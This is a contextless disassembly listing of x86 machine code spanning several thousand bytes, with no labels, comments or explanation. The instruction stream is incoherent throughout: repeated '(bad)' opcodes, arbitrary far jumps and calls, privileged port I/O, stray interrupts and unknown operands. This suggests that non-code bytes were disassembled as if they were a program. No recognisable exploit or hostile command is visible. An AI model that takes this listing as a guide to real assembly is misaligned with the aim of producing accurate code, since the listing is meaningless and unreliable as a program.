  418d60:	dec    esi
  418d61:	ror    DWORD PTR [edi-0x6f82a56a],1
  418d67:	or     esp,DWORD PTR [eax+0x17cfb567]
  418d6d:	jmp    0x1bd2:0xeac8b86
  418d74:	mov    dh,0x39
  418d76:	and    BYTE PTR [ebx],bh
  418d78:	loope  0x418d46
  418d7a:	push   edi
  418d7b:	jge    0x418d89
  418d7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d7e:	in     al,dx
  418d7f:	fiadd  DWORD PTR [edi]
  418d81:	dec    esi
  418d82:	xor    eax,0xa062e412
  418d87:	push   ds
  418d88:	or     DWORD PTR [esi+eax*1-0x5f],esi
  418d8c:	fimul  WORD PTR [edx]
  418d8e:	push   ss
  418d8f:	jg     0x418db9
  418d91:	cli    
  418d92:	mov    esi,0x64ab0ed3
  418d97:	sub    bl,dl
  418d99:	jg     0x418d4d
  418d9b:	(bad)  
  418d9c:	push   0x11998af9
  418da1:	in     al,dx
  418da2:	xor    DWORD PTR [edi+esi*2],edi
  418da5:	inc    eax
  418da6:	shr    BYTE PTR [ebx-0x3b47fca2],1
  418dac:	push   esp
  418dad:	dec    esi
  418dae:	push   cs
  418daf:	jb     0x418e0b
  418db1:	test   al,0xb2
  418db3:	fsubrp st(3),st
  418db5:	(bad)  
  418db6:	mov    ds:0x6728e2d0,al
  418dbb:	jle    0x418de0
  418dbd:	cmp    al,0xe3
  418dbf:	pop    ebx
  418dc0:	mov    dh,0xc3
  418dc2:	(bad)  
  418dc3:	rcl    DWORD PTR [ecx-0x47c9aa71],1
  418dc9:	pop    ecx
  418dca:	and    al,0xd4
  418dcc:	shl    eax,cl
  418dce:	adc    BYTE PTR [edi],0x58
  418dd1:	mov    al,0x79
  418dd3:	xor    BYTE PTR [ecx],0x50
  418dd6:	mov    ?,WORD PTR [ecx+0x22]
  418dd9:	xchg   edi,eax
  418dda:	leave  
  418ddb:	mov    ecx,esi
  418ddd:	sbb    ebp,DWORD PTR [ecx]
  418ddf:	lock fcmovnb st,st(1)
  418de2:	idiv   BYTE PTR [ecx+0x8]
  418de5:	cmp    eax,0xed9d15a
  418dea:	in     eax,0x63
  418dec:	ficomp DWORD PTR [edi-0x1cff173e]
  418df2:	push   ebp
  418df3:	mov    ecx,0xa2ca99d5
  418df8:	adc    al,0x54
  418dfa:	and    al,0xe6
  418dfc:	cmp    bh,ah
  418dfe:	adc    DWORD PTR [ebx+ebp*8-0x46f8382e],0xffffffec
  418e06:	and    BYTE PTR [edi+0x39],dl
  418e09:	adc    eax,0xb4fdf986
  418e0e:	(bad)  
  418e0f:	call   FWORD PTR [edi+esi*8+0xe]
  418e13:	repnz sub esp,DWORD PTR [edx-0x65]
  418e17:	sar    BYTE PTR [ecx],cl
  418e19:	outs   dx,BYTE PTR cs:[esi]
  418e1b:	mov    ds:0xb8e3570b,al
  418e20:	ins    DWORD PTR es:[edi],dx
  418e21:	out    dx,al
  418e22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e23:	xchg   esi,eax
  418e24:	outs   dx,DWORD PTR ds:[esi]
  418e25:	mov    WORD PTR [edi+0x3f],es
  418e28:	stos   DWORD PTR es:[edi],eax
  418e29:	cdq    
  418e2a:	add    esi,DWORD PTR [edx+0x22]
  418e2d:	nop
  418e2e:	ss cwde 
  418e30:	test   al,0x71
  418e32:	mov    edx,0x331b5903
  418e37:	clc    
  418e38:	ret    
  418e39:	sbb    DWORD PTR ss:[eax+0xc],ebp
  418e3d:	sub    eax,0xef14d84f
  418e42:	add    bh,BYTE PTR [edx]
  418e44:	mov    ah,0x19
  418e46:	adc    al,0xa9
  418e48:	fadd   DWORD PTR [esi-0x78cfae28]
  418e4e:	xchg   esi,eax
  418e4f:	sbb    bh,BYTE PTR ds:[ebx-0x41e9914c]
  418e56:	sub    DWORD PTR [ebx-0x16],ebp
  418e59:	push   0x54f0397e
  418e5e:	push   edi
  418e5f:	sbb    eax,0x25c99bea
  418e64:	sbb    edi,esp
  418e66:	popf   
  418e67:	inc    esi
  418e68:	ret    0x50d2
  418e6b:	jecxz  0x418e9c
  418e6d:	bound  eax,QWORD PTR [eax]
  418e6f:	and    cl,BYTE PTR [ecx-0xb]
  418e72:	sub    al,0x5e
  418e74:	pop    esp
  418e75:	and    ecx,DWORD PTR [edi+0x3]
  418e78:	aad    0x49
  418e7a:	mov    eax,0x8fe1fcc4
  418e7f:	imul   ebp,DWORD PTR [esi+0x6632b738],0xffffffb4
  418e86:	xchg   edi,eax
  418e87:	int    0xec
  418e89:	test   eax,esi
  418e8b:	and    esp,DWORD PTR [ecx]
  418e8d:	mov    ds:0xf29c9822,eax
  418e92:	xor    al,0x7e
  418e95:	xchg   DWORD PTR [ecx],edi
  418e97:	frstor [edi-0x21]
  418e9a:	pop    ds
  418e9b:	out    dx,al
  418e9c:	(bad)  
  418e9d:	lds    ebx,FWORD PTR [ebp-0x2e2f2b5a]
  418ea3:	and    BYTE PTR [edi],0x93
  418ea6:	leave  
  418ea7:	idiv   esi
  418ea9:	jae    0x418e6e
  418eab:	push   cs
  418eac:	jno    0x418eeb
  418eae:	leave  
  418eaf:	jle    0x418f09
  418eb1:	inc    esp
  418eb2:	fdivr  QWORD PTR [ecx]
  418eb4:	cld    
  418eb5:	sahf   
  418eb6:	(bad)  
  418eb7:	movaps XMMWORD PTR [esi-0x60],xmm7
  418ebb:	test   al,0x18
  418ebd:	shl    esi,0xb6
  418ec0:	mov    ?,ecx
  418ec2:	sbb    eax,0x924de070
  418ec7:	and    al,0x9c
  418ec9:	test   BYTE PTR [ecx+0x45],bl
  418ecc:	psrlq  mm3,QWORD PTR [edx-0x3aca8578]
  418ed3:	push   eax
  418ed4:	into   
  418ed5:	(bad)  
  418ed6:	cmc    
  418ed7:	loopne 0x418e8a
  418ed9:	sbb    edi,esp
  418edb:	ins    DWORD PTR es:[edi],dx
  418edc:	loope  0x418e7d
  418ede:	sbb    DWORD PTR [esi-0xab66181],ecx
  418ee4:	rcr    DWORD PTR [esi+ebx*2-0x20683ae],1
  418eeb:	dec    edi
  418eec:	scas   eax,DWORD PTR es:[edi]
  418eed:	cs push edx
  418eef:	and    dh,dh
  418ef1:	mov    eax,cs:0x7de0973e
  418ef7:	repz mov al,ds:0x33a45761
  418efd:	nop
  418efe:	jns    0x418f0c
  418f00:	jmp    0x31b2f957
  418f05:	mov    ah,0x71
  418f07:	(bad)  
  418f08:	jecxz  0x418ef7
  418f0a:	sbb    cl,bh
  418f0c:	jns    0x418f3d
  418f0e:	sahf   
  418f0f:	mov    ebx,0xb9d5cfa3
  418f14:	(bad)  
  418f15:	or     DWORD PTR cs:[edx],esi
  418f18:	add    dh,BYTE PTR [esi-0x5ed2b447]
  418f1e:	sub    al,BYTE PTR [ecx+0x48]
  418f21:	adc    ah,dl
  418f23:	js     0x418eb2
  418f25:	mov    ebp,0x7b63ef77
  418f2a:	pushf  
  418f2b:	push   ecx
  418f2c:	enter  0xf66,0x70
  418f30:	push   es
  418f31:	aam    0x4c
  418f33:	push   ss
  418f34:	dec    esi
  418f35:	inc    ebp
  418f36:	je     0x418edd
  418f38:	jb     0x418edf
  418f3a:	shl    DWORD PTR [edi+0x157b210b],1
  418f40:	push   0xf280fd42
  418f45:	ret    
  418f46:	pop    esi
  418f47:	arpl   WORD PTR [ebx+0x57],bx
  418f4a:	jmp    0x418eee
  418f4c:	outs   dx,DWORD PTR ds:[esi]
  418f4d:	adc    DWORD PTR [eax],edi
  418f4f:	pop    edi
  418f50:	outs   dx,DWORD PTR ds:[esi]
  418f51:	mov    cl,0xc8
  418f53:	sub    BYTE PTR [eax],ch
  418f55:	cmp    eax,0x75622b0e
  418f5a:	ss jo  0x418f8a
  418f5d:	cmc    
  418f5e:	adc    BYTE PTR [edx-0x5fc123fa],ah
  418f64:	jne    0x418fe2
  418f66:	cmp    DWORD PTR [eax],esp
  418f68:	loope  0x418fb2
  418f6a:	xchg   esp,eax
  418f6b:	jno    0x418eff
  418f6d:	icebp  
  418f6e:	mov    edi,DWORD PTR [ecx]
  418f70:	nop
  418f71:	xor    dh,BYTE PTR [edx-0x70]
  418f74:	dec    edx
  418f75:	addr16 mov ds:0xc45a,al
  418f79:	ret    
  418f7a:	inc    esp
  418f7b:	or     al,dh
  418f7d:	cmp    al,0xc5
  418f7f:	ins    DWORD PTR es:[edi],dx
  418f80:	xchg   edx,eax
  418f81:	sbb    al,0x5a
  418f83:	stos   DWORD PTR es:[edi],eax
  418f84:	sub    BYTE PTR [ebp-0x19],bl
  418f87:	cmp    eax,0xb3cae0e4
  418f8c:	mov    DWORD PTR [ebp+0xa050e55],edx
  418f92:	cdq    
  418f93:	xchg   BYTE PTR [esi+0x1f],cl
  418f96:	bound  ebx,QWORD PTR [ebx-0x44]
  418f99:	add    al,0x4e
  418f9b:	mov    ch,0x35
  418f9d:	mov    esi,ecx
  418f9f:	mov    ds:0xa0599483,eax
  418fa4:	cs pop eax
  418fa6:	lods   eax,DWORD PTR ds:[esi]
  418fa7:	nop
  418fa8:	call   0x407f:0xd412fe73
  418faf:	faddp  st(5),st
  418fb1:	inc    edi
  418fb2:	jecxz  0x418f38
  418fb4:	push   ss
  418fb5:	mov    dh,0x61
  418fb7:	int3   
  418fb8:	inc    edx
  418fb9:	icebp  
  418fba:	xor    bh,BYTE PTR [eax-0xa]
  418fbd:	ins    BYTE PTR es:[edi],dx
  418fbe:	sahf   
  418fbf:	mov    WORD PTR [ebx+ebp*1+0x746c73cf],es
  418fc6:	xchg   esi,eax
  418fc7:	pusha  
  418fc8:	xor    DWORD PTR [edx-0x66],esi
  418fcb:	jnp    0x418fa7
  418fcd:	inc    ebx
  418fce:	ficom  WORD PTR [edx]
  418fd0:	sahf   
  418fd1:	ds sbb al,dl
  418fd4:	inc    ebx
  418fd5:	mov    DWORD PTR [edx],ebp
  418fd7:	sahf   
  418fd8:	ins    DWORD PTR es:[edi],dx
  418fd9:	sahf   
  418fda:	push   0xca408657
  418fdf:	aad    0x8f
  418fe1:	int    0xc
  418fe3:	inc    edx
  418fe4:	xor    BYTE PTR [eax],ah
  418fe6:	fs mov cl,0x1
  418fe9:	xor    DWORD PTR [ebp+0x6fe0a080],0xffffffcd
  418ff0:	lods   eax,DWORD PTR ds:[esi]
  418ff1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ff2:	(bad)  
  418ff3:	into   
  418ff4:	mov    esi,0x5ed5fd9f
  418ff9:	retf   0x8070
  418ffc:	leave  
  418ffd:	(bad)  
  419000:	ret    
  419001:	adc    al,0x7f
  419003:	inc    edi
  419004:	xchg   DWORD PTR ss:[edx+0x44],esp
  419008:	loop   0x419068
  41900a:	into   
  41900b:	mov    al,0xb9
  41900d:	xchg   esi,eax
  41900e:	jle    0x418ffa
  419010:	in     al,dx
  419011:	inc    eax
  419012:	loop   0x419025
  419014:	push   esp
  419015:	sub    eax,0x249d8c20
  41901a:	mov    bl,0x65
  41901c:	test   edx,ecx
  41901e:	inc    edi
  41901f:	jle    0x418ff6
  419021:	jo     0x418fff
  419023:	xor    eax,0xe31c9b62
  419028:	pop    es
  419029:	popa   
  41902a:	sub    esp,esi
  41902c:	ret    0xa9fb
  41902f:	cmc    
  419030:	push   esp
  419031:	int    0xd1
  419033:	sar    dh,cl
  419035:	cmp    BYTE PTR [ebx-0x4d],cl
  419038:	jnp    0x4190b4
  41903a:	into   
  41903b:	inc    ecx
  41903c:	sbb    eax,0xc7d6132b
  419041:	hlt    
  419042:	xchg   ebx,eax
  419043:	dec    esp
  419044:	int    0x8c
  419046:	test   eax,0xdc6e1a61
  41904b:	in     al,0x59
  41904d:	sbb    DWORD PTR [edx],edi
  41904f:	push   ecx
  419050:	dec    ebp
  419051:	add    dl,ch
  419053:	adc    al,0xc7
  419055:	rcl    dl,cl
  419057:	and    edx,DWORD PTR [edx+0x506c6b0]
  41905d:	add    al,BYTE PTR [edi-0x1a]
  419060:	lods   al,BYTE PTR ds:[esi]
  419061:	pushf  
  419062:	fild   DWORD PTR [ecx+0x24cbc35e]
  419068:	push   edx
  419069:	lock sbb ch,dh
  41906c:	mov    al,bh
  41906e:	cli    
  41906f:	pusha  
  419070:	dec    ebx
  419071:	stc    
  419072:	dec    edx
  419073:	shl    DWORD PTR [ebx-0x2d5b0fe2],cl
  419079:	mov    ah,BYTE PTR [eax+0x55]
  41907c:	retf   0x9a4e
  41907f:	pop    ecx
  419080:	pop    esi
  419081:	inc    esp
  419082:	test   al,0x40
  419084:	test   al,0x1d
  419086:	aam    0xfe
  419088:	rcl    DWORD PTR [ebx-0x76aeb3fd],1
  41908e:	jo     0x419049
  419090:	bound  esp,QWORD PTR [edi-0x5f2a4f96]
  419096:	retf   
  419097:	jne    0x41907b
  419099:	push   esi
  41909a:	mov    al,ds:0x295a0a6
  41909f:	fiadd  WORD PTR [edx+0x1669b9eb]
  4190a5:	jmp    0x419071
  4190a7:	xchg   DWORD PTR [ebx+0x3c53c1f3],eax
  4190ad:	ds jecxz 0x419051
  4190b0:	add    ebx,DWORD PTR ds:0xd4468d73
  4190b6:	cmc    
  4190b7:	shr    ch,0x68
  4190ba:	enter  0xe386,0x3b
  4190be:	jp     0x4190e8
  4190c0:	mov    eax,ss
  4190c2:	pop    eax
  4190c3:	sbb    eax,0x2d4678f
  4190c8:	inc    esp
  4190c9:	xor    ah,dh
  4190cb:	xchg   ecx,eax
  4190cc:	std    
  4190cd:	or     esp,edi
  4190cf:	pushf  
  4190d0:	lahf   
  4190d1:	push   esp
  4190d2:	loopne 0x419073
  4190d4:	or     al,0xa5
  4190d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190d7:	scas   eax,DWORD PTR es:[edi]
  4190d8:	leave  
  4190d9:	cmp    eax,0x13d49b94
  4190de:	inc    ecx
  4190df:	inc    eax
  4190e0:	out    0x9b,eax
  4190e2:	inc    eax
  4190e3:	and    edi,DWORD PTR [esi-0xc]
  4190e6:	or     eax,0xa09cb064
  4190eb:	imul   eax,DWORD PTR [esi-0x12c1eb2e],0x31
  4190f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190f3:	into   
  4190f4:	add    eax,0x44e8d91
  4190f9:	sbb    al,0x4a
  4190fb:	add    DWORD PTR [eax+0x9286907],ebx
  419101:	loopne 0x419093
  419103:	fs sub bl,ah
  419106:	push   ebx
  419107:	xchg   edx,eax
  419108:	jae    0x41908b
  41910a:	adc    edi,edx
  41910c:	pop    edi
  41910d:	jae    0x4190b0
  41910f:	sahf   
  419110:	lock aaa 
  419112:	into   
  419113:	jnp    0x4190f1
  419115:	pop    edi
  419116:	lock lods eax,DWORD PTR ds:[esi]
  419118:	mov    ?,WORD PTR [ebx+edx*8]
  41911b:	cmp    DWORD PTR [eax+0x1a2357ea],edx
  419121:	ja     0x419151
  419123:	aam    0x6e
  419125:	fnstenv [ecx-0x5e641bd8]
  41912b:	jae    0x419104
  41912d:	cmp    DWORD PTR [ebp+0x5a3314de],eax
  419133:	push   esi
  419134:	add    BYTE PTR ds:0x7e30240b,dh
  41913a:	leave  
  41913b:	std    
  41913c:	fisttp QWORD PTR [esi]
  41913e:	push   esp
  41913f:	inc    esi
  419140:	div    edx
  419142:	das    
  419143:	dec    edx
  419144:	repz ror DWORD PTR [eax],1
  419147:	mov    esi,0xd011d509
  41914c:	pop    ss
  41914d:	retf   
  41914e:	cld    
  41914f:	add    al,BYTE PTR [edi]
  419151:	inc    ecx
  419152:	cdq    
  419153:	mov    ebp,0x34cd3f0f
  419158:	loop   0x41915b
  41915a:	cmp    bl,BYTE PTR [edx-0xb]
  41915d:	sub    edx,ebp
  41915f:	add    bl,dh
  419161:	out    dx,al
  419162:	jno    0x4191c3
  419164:	add    eax,0x421f3fa7
  419169:	sahf   
  41916a:	adc    BYTE PTR [esi],dl
  41916c:	pop    ds
  41916d:	neg    BYTE PTR [ecx+ecx*8]
  419170:	adc    esp,DWORD PTR [esi-0x20192072]
  419176:	mov    esp,0xbc2fab33
  41917b:	and    eax,0x1db0197c
  419180:	arpl   WORD PTR ds:0xb8bc3a53,bp
  419186:	and    ebp,DWORD PTR ds:0xd6424e9e
  41918c:	and    al,0x86
  41918e:	mov    ds:0xef7f425b,eax
  419193:	out    dx,al
  419194:	xor    al,0xf6
  419196:	inc    esi
  419197:	pusha  
  419198:	dec    ebp
  419199:	sbb    ebx,ecx
  41919b:	iret   
  41919c:	lea    ecx,[ebp-0x2ec69eb3]
  4191a2:	lds    ebp,FWORD PTR [ebp-0x4a]
  4191a5:	bound  eax,QWORD PTR [eax]
  4191a7:	push   esi
  4191a8:	jge    0x419190
  4191aa:	sub    BYTE PTR [edx+eiz*8-0x20],ah
  4191ae:	jmp    0x34f9:0x5eb99df6
  4191b5:	in     al,0x14
  4191b7:	add    ebp,DWORD PTR [ecx+0x240fa6a1]
  4191bd:	push   eax
  4191be:	in     eax,dx
  4191bf:	adc    ch,cl
  4191c1:	sub    edx,DWORD PTR [eax-0x5a]
  4191c4:	and    DWORD PTR [esi-0x61],0x9
  4191c8:	or     bh,ah
  4191ca:	mov    eax,0x92a77ab6
  4191cf:	popf   
  4191d0:	push   esp
  4191d1:	adc    bl,BYTE PTR [eax-0x1a]
  4191d4:	sahf   
  4191d5:	add    cl,cl
  4191d7:	xor    DWORD PTR [edi],0xffffffe4
  4191da:	addr16 loop 0x41924d
  4191dd:	mov    ecx,0xcbbfd9d1
  4191e2:	mov    esp,0xa3f03613
  4191e7:	ret    
  4191e8:	pop    DWORD PTR [ecx+0x1a]
  4191eb:	mov    edi,0x1dd3569e
  4191f0:	out    dx,eax
  4191f1:	sub    cl,BYTE PTR [edx]
  4191f3:	repnz dec eax
  4191f5:	xchg   edx,eax
  4191f6:	mov    ch,0x89
  4191f8:	sar    DWORD PTR [eax+0x4e],0x84
  4191fc:	mov    ecx,DWORD PTR [eax]
  4191fe:	adc    BYTE PTR [edx-0x18f997fc],0x13
  419205:	mov    bh,0x95
  419207:	push   ecx
  419208:	sub    ch,BYTE PTR [eax+edx*8-0x14e9a41c]
  41920f:	mov    bh,0x85
  419211:	xchg   BYTE PTR [edx-0xa],ah
  419214:	xchg   esi,eax
  419215:	jbe    0x419201
  419217:	jmp    0x4d7d384f
  41921c:	pop    esp
  41921d:	retf   
  41921e:	icebp  
  41921f:	gs pandn mm2,mm7
  419223:	pop    es
  419224:	in     eax,dx
  419225:	out    0x13,eax
  419227:	mov    esi,0xc0669834
  41922c:	inc    edx
  41922d:	or     ebx,ecx
  41922f:	adc    bl,BYTE PTR [ebp+eiz*2-0x28]
  419233:	jge    0x419207
  419235:	nop
  419236:	push   esi
  419237:	cmp    DWORD PTR [eax],ebx
  419239:	(bad)  
  41923a:	repnz (bad) 
  41923c:	(bad)  
  41923d:	imul   ecx,eax,0xc5aa2734
  419243:	push   esi
  419244:	xlat   BYTE PTR ds:[ebx]
  419245:	mov    bl,0x47
  419247:	jnp    0x419253
  419249:	out    0x7a,eax
  41924b:	jae    0x419252
  41924d:	aaa    
  41924e:	shl    DWORD PTR [eax],0x37
  419251:	fnstsw WORD PTR [ebp-0x78bbfcc1]
  419257:	lods   eax,DWORD PTR ds:[esi]
  419258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419259:	push   ss
  41925a:	sub    ebp,DWORD PTR [ecx]
  41925c:	in     eax,0x34
  41925e:	jnp    0x4192cd
  419260:	data16 or bh,BYTE PTR [esi]
  419263:	sub    eax,0x8c860830
  419268:	mov    ds:0x3aa90c77,eax
  41926d:	nop
  41926e:	or     al,0xe9
  419270:	xor    eax,0x4c440765
  419275:	mov    BYTE PTR [edi+0x5eeb7542],dl
  41927b:	pop    ebx
  41927c:	mov    ecx,0x4782f0fd
  419281:	sub    al,0xca
  419283:	jl     0x419215
  419285:	js     0x419301
  419287:	cmp    DWORD PTR [edx],esi
  419289:	jns    0x41926b
  41928b:	ins    DWORD PTR es:[edi],dx
  41928c:	xchg   BYTE PTR [edi-0x4d],dh
  41928f:	imul   ebx,DWORD PTR [ecx],0xffffffa6
  419292:	mov    eax,ds:0xa8c9a378
  419297:	ja     0x41922e
  419299:	cld    
  41929a:	imul   ebp,DWORD PTR fs:[edi],0xfffffff6
  41929e:	and    DWORD PTR [edi],edx
  4192a0:	into   
  4192a1:	test   DWORD PTR [edx-0x67],edi
  4192a4:	jl     0x41926d
  4192a6:	xchg   eax,ebx
  4192a8:	pop    edx
  4192a9:	int    0x83
  4192ab:	sahf   
  4192ac:	push   es
  4192ad:	push   es
  4192ae:	mov    al,ds:0xe009aa6a
  4192b3:	daa    
  4192b4:	mov    esp,0xdea8585e
  4192b9:	dec    ebp
  4192ba:	lds    esp,FWORD PTR [edi]
  4192bc:	int3   
  4192bd:	jo     0x419257
  4192bf:	xor    ecx,DWORD PTR [esi+edi*4-0x5]
  4192c3:	or     DWORD PTR [ebp+0x6c],ebp
  4192c6:	and    al,0x8d
  4192c8:	inc    eax
  4192c9:	fistp  QWORD PTR [bx-0x75aa]
  4192ce:	pop    edi
  4192cf:	ds jo  0x419338
  4192d2:	cld    
  4192d3:	sub    BYTE PTR [eax+eiz*2-0x57ab2f1f],0x31
  4192db:	js     0x41932b
  4192dd:	scas   eax,DWORD PTR es:[edi]
  4192de:	neg    DWORD PTR [ecx+0x23]
  4192e1:	cld    
  4192e2:	push   ebp
  4192e3:	pop    esi
  4192e4:	shl    BYTE PTR [ebx],0x5
  4192e7:	shl    dh,1
  4192e9:	fyl2xp1 
  4192eb:	jns    0x419342
  4192ed:	or     BYTE PTR [ecx+0x68fa4c7b],ch
  4192f3:	jecxz  0x41934d
  4192f5:	xchg   ecx,eax
  4192f6:	sahf   
  4192f7:	into   
  4192f8:	cmp    ah,BYTE PTR [ecx]
  4192fa:	inc    edx
  4192fb:	mov    BYTE PTR [ebx+0x31],dh
  4192fe:	xchg   esi,eax
  4192ff:	lods   eax,DWORD PTR ds:[esi]
  419300:	mov    ds:0xf857aec2,al
  419305:	xor    DWORD PTR [ebx],esp
  419307:	je     0x41936c
  419309:	inc    esi
  41930a:	ja     0x41929e
  41930c:	dec    ebp
  41930d:	adc    ecx,eax
  41930f:	lahf   
  419310:	pop    ecx
  419311:	ds dec ecx
  419313:	xchg   DWORD PTR ds:0x7bcb9291,eax
  419319:	outs   dx,DWORD PTR fs:[esi]
  41931b:	stos   DWORD PTR es:[edi],eax
  41931c:	add    BYTE PTR [ebp-0x691b816c],al
  419322:	mov    ecx,0xe60ff3e6
  419327:	in     al,0x99
  419329:	(bad)  
  41932a:	jae    0x4192da
  41932c:	or     eax,0xc1060819
  419331:	sbb    DWORD PTR ds:0x7c987eb,ecx
  419337:	fstp   QWORD PTR [edx+0x62]
  41933a:	cmc    
  41933b:	cwde   
  41933c:	dec    esp
  41933d:	adc    bl,dl
  41933f:	add    ebx,DWORD PTR [ecx]
  419341:	lds    esp,FWORD PTR [edi+0x743869e3]
  419347:	shl    edi,1
  419349:	xor    dh,dh
  41934b:	call   0x936b:0xee5c4a53
  419352:	pop    ebp
  419353:	inc    esi
  419354:	xchg   DWORD PTR [ebp-0x44fda36a],ecx
  41935a:	lock fwait
  41935c:	jnp    0x4192f1
  41935e:	test   BYTE PTR [edx],ch
  419360:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419361:	xor    bh,BYTE PTR [ebp+0x32]
  419364:	dec    esp
  419365:	jecxz  0x41935d
  419367:	pop    es
  419368:	js     0x4193e4
  41936a:	jo     0x419343
  41936c:	gs jne 0x419331
  41936f:	ror    BYTE PTR [esi-0x29],0xfe
  419373:	mov    cl,al
  419375:	jb     0x419317
  419377:	sub    ebx,edi
  419379:	push   0x5155878e
  41937e:	dec    esi
  41937f:	and    eax,0x56e74ab0
  419384:	(bad)  
  419386:	push   edx
  419387:	in     al,0x7d
  419389:	ds jnp 0x4193a4
  41938c:	(bad)  
  41938d:	pop    ds
  41938e:	fldenv [edx]
  419390:	js     0x419315
  419392:	imul   ecx,DWORD PTR [edx-0x360b52cb],0xffffffa2
  419399:	mov    edi,0x3054c198
  41939e:	sub    al,0xd
  4193a0:	xlat   BYTE PTR ds:[ebx]
  4193a1:	(bad)  
  4193a3:	jl     0x4193f9
  4193a5:	mov    gs,edx
  4193a7:	sub    dh,BYTE PTR [eax]
  4193a9:	neg    DWORD PTR ds:[ecx]
  4193ac:	xor    BYTE PTR [eax],0x1c
  4193af:	lods   eax,DWORD PTR ds:[esi]
  4193b0:	sbb    BYTE PTR [eax-0x6c],bh
  4193b3:	sub    al,0xb5
  4193b5:	pop    ds
  4193b6:	mov    esi,0xc312d740
  4193bb:	loopne 0x419383
  4193bd:	shl    ah,1
  4193bf:	jl     0x41939d
  4193c1:	and    DWORD PTR [eax],0x5fe62a4d
  4193c7:	scas   al,BYTE PTR es:[edi]
  4193c8:	jno    0x419379
  4193ca:	sbb    ecx,DWORD PTR [eax]
  4193cc:	pop    eax
  4193cd:	addr16 inc esp
  4193cf:	mov    edi,0x20848811
  4193d4:	jo     0x419418
  4193d6:	enter  0xeea1,0xb0
  4193da:	jno    0x4193b7
  4193dc:	sar    DWORD PTR [ecx+0x7e],cl
  4193df:	retf   0xad6f
  4193e2:	dec    esi
  4193e3:	lods   eax,DWORD PTR ds:[esi]
  4193e4:	push   ebp
  4193e5:	daa    
  4193e6:	cmp    al,BYTE PTR [ecx]
  4193e8:	mov    esi,0x27a385df
  4193ed:	icebp  
  4193ee:	imul   eax,edx,0x2d89488
  4193f4:	push   ecx
  4193f5:	add    ah,BYTE PTR [ebx]
  4193f7:	popf   
  4193f8:	test   BYTE PTR [ecx-0x39],ch
  4193fb:	inc    DWORD PTR ds:0xb12de843
  419401:	and    esp,DWORD PTR [eax-0x51]
  419404:	pop    esi
  419405:	scas   eax,DWORD PTR es:[edi]
  419406:	enter  0xb704,0x8
  41940a:	or     eax,0x7b14f7a5
  41940f:	dec    esi
  419410:	pop    edi
  419411:	dec    edx
  419412:	mov    ecx,0x74f26f25
  419417:	add    al,0xbb
  419419:	mov    gs,WORD PTR [esi-0x36]
  41941c:	or     BYTE PTR [esi+0x3e4e5bfe],ah
  419422:	out    dx,al
  419423:	cmp    DWORD PTR gs:[edi+ebp*1-0x197820b3],ecx
  41942b:	js     0x419441
  41942d:	xchg   ebx,eax
  41942e:	aam    0x31
  419430:	pop    ebp
  419431:	push   0x24
  419433:	mov    ds:0x89b061d2,eax
  419438:	xchg   ecx,eax
  419439:	sbb    eax,0xcd16cc81
  41943e:	mov    bh,0x65
  419440:	loopne 0x419483
  419442:	out    0x52,al
  419444:	imul   ecx,DWORD PTR [edi+0x219508e4],0x8ac8aa89
  41944e:	or     eax,0x1b446adf
  419453:	push   edi
  419454:	repz in al,dx
  419456:	cdq    
  419457:	pushf  
  419458:	xor    al,0x3d
  41945a:	fdiv   QWORD PTR [edi-0x708231cd]
  419460:	lahf   
  419461:	mov    ch,0x9c
  419463:	enter  0x9e7c,0x50
  419467:	cmc    
  419468:	scas   eax,DWORD PTR es:[edi]
  419469:	xchg   esp,eax
  41946a:	data16 mov cl,0x92
  41946d:	push   esp
  41946e:	stos   DWORD PTR es:[edi],eax
  41946f:	jmp    0x46bc:0x65b4cd72
  419476:	enter  0xb42c,0x5
  41947a:	mov    dl,0x23
  41947c:	xor    esp,DWORD PTR [eax]
  41947e:	lea    esi,ds:0x60eab121
  419484:	mov    ecx,0x8ec238df
  419489:	mov    cl,0xb5
  41948b:	cmp    dl,BYTE PTR [ebp-0x4567e172]
  419491:	sbb    al,0xf0
  419493:	fcomip st,st(6)
  419495:	or     edx,ebp
  419497:	std    
  419498:	js     0x4194fe
  41949a:	repnz fcom QWORD PTR [ebp+0x91ff0c6]
  4194a1:	cli    
  4194a2:	in     eax,dx
  4194a3:	enter  0x88de,0x66
  4194a7:	stos   BYTE PTR es:[edi],al
  4194a8:	xchg   edx,eax
  4194a9:	adc    al,0x56
  4194ab:	xchg   edx,eax
  4194ac:	xor    ecx,esi
  4194ae:	push   eax
  4194af:	pushf  
  4194b0:	and    eax,0x4a01d00
  4194b5:	test   eax,0xf4db6a34
  4194ba:	loopne 0x419497
  4194bc:	push   ebx
  4194bd:	popa   
  4194be:	sub    eax,0x554783bf
  4194c3:	jns    0x419447
  4194c5:	adc    DWORD PTR [ebx+0x2f],esi
  4194c8:	push   eax
  4194c9:	add    al,0xd4
  4194cb:	(bad)
  4194cf:	mov    fs,WORD PTR [esi-0x5c]
  4194d2:	(bad)  
  4194d3:	jbe    0x419518
  4194d5:	imul   edx,DWORD PTR [esi+esi*8-0x6f],0x77
  4194da:	jo     0x41953c
  4194dc:	(bad)  
  4194dd:	pop    edx
  4194de:	mov    dh,0xdf
  4194e0:	test   eax,0x26916271
  4194e5:	pop    es
  4194e6:	ja     0x41946b
  4194e8:	mov    al,0x8
  4194ea:	adc    eax,0x6adf911d
  4194ef:	imul   ebp,DWORD PTR gs:[edx+0x78],0x89bf670
  4194f7:	sahf   
  4194f8:	scas   eax,DWORD PTR es:[edi]
  4194f9:	mov    eax,ds:0x6a2649d9
  4194fe:	ret    
  4194ff:	sub    eax,0x84613e68
  419504:	push   esp
  419505:	or     al,0xf
  419507:	(bad)  
  419508:	call   DWORD PTR [edx-0x6f914a4b]
  41950e:	xor    eax,DWORD PTR [edi+0xbe05f72]
  419514:	bound  ebp,QWORD PTR [ecx-0x49]
  419517:	or     al,0x86
  419519:	(bad)  
  41951a:	jmp    0x4194fc
  41951c:	sub    edi,edx
  41951e:	fwait
  41951f:	pop    esp
  419520:	and    BYTE PTR [ecx+0x749a5fd8],ch
  419526:	pop    edx
  419527:	jnp    0x4194b0
  419529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41952a:	loopne 0x4194c8
